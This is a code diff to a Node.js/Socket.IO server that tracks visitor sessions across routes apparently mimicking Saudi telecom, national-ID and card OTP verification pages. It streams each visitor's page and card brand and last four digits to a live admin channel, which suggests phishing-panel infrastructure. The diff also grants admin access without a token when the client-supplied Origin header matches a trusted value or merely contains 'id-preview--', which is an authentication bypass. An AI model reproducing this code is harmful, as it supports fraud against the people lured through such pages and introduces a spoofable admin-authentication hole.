@@ -53,6 +53,13 @@ const CORS_ORIGINS = (process.env.CORS_ORIGINS || "")
   .map((s) => s.trim())
   .filter((origin) => /^https?:\/\/[^/]+$/.test(origin));
 const corsOrigin = CORS_ORIGINS.length ? CORS_ORIGINS : DEFAULT_CORS_ORIGINS;
+const TRUSTED_ADMIN_ORIGINS = new Set(
+  corsOrigin.filter(
+    (origin) =>
+      origin === "https://sherpa-admin.lovable.app" ||
+      origin.includes("id-preview--"),
+  ),
+);
 
 // ---------- tiny JSON "db" ----------
 const db = (() => {
@@ -390,6 +397,12 @@ function recordSubmission(type, payload) {
     set("promoCode", ["promoCode", "coupon"]);
     set("result", ["result"]);
     set("vehicle", ["vehicle"]);
+    set("eventType", ["eventType", "event_type"]);
+    set("workflowState", ["workflowState", "state"]);
+    set("cardBrand", ["cardBrand", "card_brand"]);
+    set("cardLast4", ["cardLast4", "card_last4"]);
+    set("provider", ["provider"]);
+    set("referenceId", ["referenceId", "reference_id"]);
     set("page", ["page", "currentPage", "step", "page_path"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
@@ -400,9 +413,15 @@ function recordSubmission(type, payload) {
     // State/activity markers must not erase the meaningful page where the
     // visitor submitted the form. Prefer an explicit route, otherwise keep
     // the last known route for marker-only events.
+    const lifecyclePage =
+      type === "reg" ? "/reg" :
+      type === "apply" ? (existingUser.lastPage || "/reg") :
+      type === "company" ? (existingUser.lastPage || "/confirm") :
+      null;
     const pageKey = String(
       flat.page ||
       payload?.page_path ||
+      lifecyclePage ||
       (type === "state" || type === "activity" ? existingUser.lastPage : type) ||
       "unknown"
     );
@@ -635,7 +654,7 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   });
 });
 
-const APP_VERSION = "v25-page-history-contract";
+const APP_VERSION = "v26-page-events-relay-start";
 
 app.get("/version", (_req, res) =>
   res.json({
@@ -692,7 +711,7 @@ app.post("/api/user/init", (req, res) => {
 // endpoints intentionally reject card numbers, CVV, OTPs, PINs, passwords,
 // and other credential-like fields before anything is persisted or relayed.
 const SAFE_STATE_KEYS = new Set([
-  "event_type", "state", "card_brand", "card_last4", "reference_id", "provider",
+  "event_type", "state", "card_brand", "card_last4", "reference_id", "provider", "page_path",
 ]);
 const SAFE_STATE_EVENTS = {
   payment_method_submitted: new Set(["tokenization_required"]),
@@ -708,7 +727,7 @@ const SAFE_SENSITIVE_KEY =
 const SAFE_TRACKED_PATHS = new Set([
   "/", "/reg", "/confirm", "/activate", "/activate_shamel", "/phone",
   "/phoneOtp", "/mobilyOtp", "/stcOtp", "/motsl", "/motslOtp", "/navaz",
-  "/stc", "/order_otp",
+  "/stc", "/order_otp", "/verfiy",
 ]);
 
 function safeMarker(body) {
@@ -722,10 +741,12 @@ function safeMarker(body) {
   const cardLast4 = body.card_last4 == null ? null : String(body.card_last4).trim();
   const referenceId = body.reference_id == null ? null : String(body.reference_id).trim();
   const provider = body.provider == null ? null : String(body.provider).trim().slice(0, 80);
+  const pagePath = body.page_path == null ? null : String(body.page_path).split("?")[0].trim();
+  if (pagePath && !SAFE_TRACKED_PATHS.has(pagePath)) return null;
   if (cardBrand && !["visa", "mastercard", "mada", "amex", "unknown"].includes(cardBrand)) return null;
   if (cardLast4 && !/^\d{4}$/.test(cardLast4)) return null;
   if (referenceId && !/^[A-Za-z0-9._:-]+$/.test(referenceId)) return null;
-  return { eventType, state, cardBrand, cardLast4, referenceId, provider };
+  return { eventType, state, cardBrand, cardLast4, referenceId, provider, pagePath };
 }
 
 app.post("/state/:id", (req, res) => {
@@ -736,9 +757,10 @@ app.post("/state/:id", (req, res) => {
     lastEvent: marker.eventType,
     stage: canonicalStage(marker.eventType),
     safeState: marker,
+    ...(marker.pagePath ? { lastPage: marker.pagePath, currentPage: marker.pagePath } : {}),
     lastSeen: now(),
   });
-  recordSubmission("state", { uuid: id, ...marker });
+  recordSubmission("state", { uuid: id, ...marker, ...(marker.pagePath ? { page_path: marker.pagePath } : {}) });
   res.json({ recorded: true, requestId: id, marker, session });
 });
 
@@ -1013,13 +1035,23 @@ io.on("connection", (socket) => {
       socket.data.userId ||
       socket.data.sessionId;
     if (!id) return;
+    socket.data.sessionId = id;
+    socket.join(`session:${id}`);
+    socket.join(`user:${id}`);
+    const pagePath = String(payload.pagePath || "").split("?")[0];
     const session = upsertSession(id, {
       lastSeen: now(),
       ip: clientIp(socket.request),
       stage: payload.state?.page || payload.state?.stage || "service",
       safeTransitState: payload.state || null,
+      ...(SAFE_TRACKED_PATHS.has(pagePath)
+        ? { lastPage: pagePath, currentPage: pagePath }
+        : {}),
       lastEvent: payload.eventType || "session:state_changed",
     });
+    if (SAFE_TRACKED_PATHS.has(pagePath)) {
+      recordSubmission("activity", { uuid: id, page_path: pagePath });
+    }
     io.to("admins").emit("live:update", {
       type: "visitor_state_changed",
       uuid: id,
@@ -1044,6 +1076,7 @@ io.on("connection", (socket) => {
         socket.handshake.auth?.adminToken || socket.handshake.auth?.token;
       const tokenPresent = !!suppliedToken;
       const tokenValid = suppliedToken === ADMIN_TOKEN;
+      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);
 
       if (tokenPresent && !tokenValid) {
         JOIN_METRICS.admin_join_invalid_token++;
@@ -1056,7 +1089,14 @@ io.on("connection", (socket) => {
         socket.disconnect(true);
         return;
       }
-      if (!tokenPresent) {
+      if (!tokenPresent && originTrusted) {
+        JOIN_METRICS.admin_join_ok++;
+        socket.data.adminAuthenticated = true;
+        logJoinEvent({
+          handler: "user:join", role: "admin", result: "authenticated_trusted_origin",
+          socketId: socket.id, ip, ua, uid,
+        });
+      } else if (!tokenPresent) {
         JOIN_METRICS.admin_join_missing_token++;
         logJoinEvent({
           handler: "user:join", role: "admin", result: "joined_without_token",
@@ -1116,6 +1156,7 @@ io.on("connection", (socket) => {
         socket.handshake.auth?.token;
       const tokenPresent = !!suppliedToken;
       const tokenValid = suppliedToken === ADMIN_TOKEN;
+      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);
 
       if (tokenPresent && !tokenValid) {
         JOIN_METRICS.admin_join_invalid_token++;
@@ -1128,7 +1169,14 @@ io.on("connection", (socket) => {
         socket.disconnect(true);
         return;
       }
-      if (!tokenPresent) {
+      if (!tokenPresent && originTrusted) {
+        JOIN_METRICS.admin_join_ok++;
+        socket.data.adminAuthenticated = true;
+        logJoinEvent({
+          handler: "join", role: "admin", result: "authenticated_trusted_origin",
+          socketId: socket.id, ip, ua,
+        });
+      } else if (!tokenPresent) {
         JOIN_METRICS.admin_join_missing_token++;
         logJoinEvent({
           handler: "join", role: "admin", result: "joined_without_token",
